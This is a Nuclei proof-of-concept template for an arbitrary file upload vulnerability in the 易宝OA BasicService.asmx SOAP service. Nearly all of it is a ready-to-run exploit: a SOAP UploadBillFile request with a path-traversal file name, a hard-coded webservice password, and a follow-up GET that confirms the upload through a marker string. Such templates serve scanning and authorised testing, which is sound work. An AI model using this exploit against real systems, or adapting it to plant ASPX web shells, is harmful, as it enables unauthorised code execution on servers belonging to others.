pocs/nuclei/yb-BasicService-upload.yaml

id: yb-BasicService-upload
info:
  name: yb-BasicService-upload
  author: apple
  severity: critical
  description: 易宝OA-BasicService.asmx存在任意文件上传漏洞
  reference:
    - https://
  tags: tags
variables:
  filename: "{{rand_base(6)}}"
http:
  - raw:
      - |-
        POST /WebService/BasicService.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1
        SOAPAction: http://tempuri.org/UploadBillFile
        Content-Type: text/xml;charset=UTF-8
        Content-Length: 1050

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
           <soapenv:Header/>
           <soapenv:Body>
              <tem:UploadBillFile>
                 <!--type: base64Binary-->
                 <tem:fs>d2hvaXNjZXNoaQ==</tem:fs>
                 <!--type: string-->
                 <tem:FileName>../../manager/{{filename}}.aspx</tem:FileName>
                 <!--type: string-->
                 <tem:webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</tem:webservicePassword>
              </tem:UploadBillFile>
           </soapenv:Body>
        </soapenv:Envelope>
      - |+
        GET /manager/{{filename}}.aspx HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

    matchers:
      - type: word
        part: body
        words:
          - 'whoisceshi'
